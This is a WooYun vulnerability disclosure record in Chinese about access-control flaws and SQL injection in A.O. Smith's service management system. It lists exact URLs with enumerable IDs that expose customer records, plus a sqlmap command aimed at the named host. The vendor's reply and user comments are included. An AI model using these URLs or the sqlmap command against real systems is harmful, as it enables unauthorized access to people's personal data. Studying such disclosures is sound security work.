{"id": 66956, "wybug_id": "wooyun-2015-0143064", "wybug_title": "AO史密斯某系统越权+SQL注入漏洞泄露全国范围内大量客户信息（用AOSMITH的举手）", "wybug_corp": "hotwater.com.cn", "wybug_author": "路人甲", "wybug_date": "2015-09-24 10:08", "wybug_open_date": "2015-11-10 08:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-10：\t细节向公众公开  简要描述： 其他不说，就AO史密斯的安装师傅的专业态度就值得赞！ 详细说明：  艾欧史密斯服务管理系统：\nhttp://service.hotwater.com.cn:8099/login.asp\n有多处url越权及SQL注入漏洞：（1）第一处越权地址泄露全国各门店维修单信息，包含客户信息（姓名、电话、购买时间等），其中teamid是机构参数，可遍历获取不同门店不同时间段的数据：\nhttp://service.hotwater.com.cn:8099/repair/ReturnDemand.asp?startdate=2011-5-21&enddate=2015-6-20&teamid=4B917&ope=1\n\n\n\n\n（2）第二处结算信息：\nhttp://service.hotwater.com.cn:8099/CCCByInstTeam/WebForm1.aspx?insteamid=4A660\n\n\n（3）直接泄露客户信息，参数accountid可遍历：\nhttp://service.hotwater.com.cn:8099/query/QueryAccountAddress_Save.asp?accountid=150312000757\n\n\n（4）赠品管理\nhttp://service.hotwater.com.cn:8099/CCCByInstTeam/Present_apply.aspx?userid=Q3TR8A00BKGK\n\n\n下面看SQL注入：\nsqlmap.py -u \"http://service.hotwater.com.cn:8099/CCCByInstTeam/WebDDYPJ.aspx?userid=QHT5VA001WA4\" -D aosmith --tables --time-sec 2\n\n\n\n\n\n\n   漏洞证明：  艾欧史密斯服务管理系统：\nhttp://service.hotwater.com.cn:8099/login.asp\n有多处url越权及SQL注入漏洞：（1）第一处越权地址泄露全国各门店维修单信息，包含客户信息（姓名、电话、购买时间等），其中teamid是机构参数，可遍历获取不同门店不同时间段的数据：\nhttp://service.hotwater.com.cn:8099/repair/ReturnDemand.asp?startdate=2011-5-21&enddate=2015-6-20&teamid=4B917&ope=1\n\n\n\n\n（2）第二处结算信息：\nhttp://service.hotwater.com.cn:8099/CCCByInstTeam/WebForm1.aspx?insteamid=4A660\n\n\n（3）直接泄露客户信息，参数accountid可遍历：\nhttp://service.hotwater.com.cn:8099/query/QueryAccountAddress_Save.asp?accountid=150312000757\n\n\n（4）赠品管理\nhttp://service.hotwater.com.cn:8099/CCCByInstTeam/Present_apply.aspx?userid=Q3TR8A00BKGK\n\n\n下面看SQL注入：\nsqlmap.py -u \"http://service.hotwater.com.cn:8099/CCCByInstTeam/WebDDYPJ.aspx?userid=QHT5VA001WA4\" -D aosmith --tables --time-sec 2\n\n\n\n\n\n\n   修复方案：  一起打包，20rank可好？   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-26 08:55 厂商回复： 该系统之前已有人提交漏洞，处于过渡期，目前已停用，谢谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-26 20:57 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  没钱不用    \n     2015-11-10 08:59 |    \t\txxsec \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:6        | kali，metasploit)\t\t \n  挖洞不易，居然10打发了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}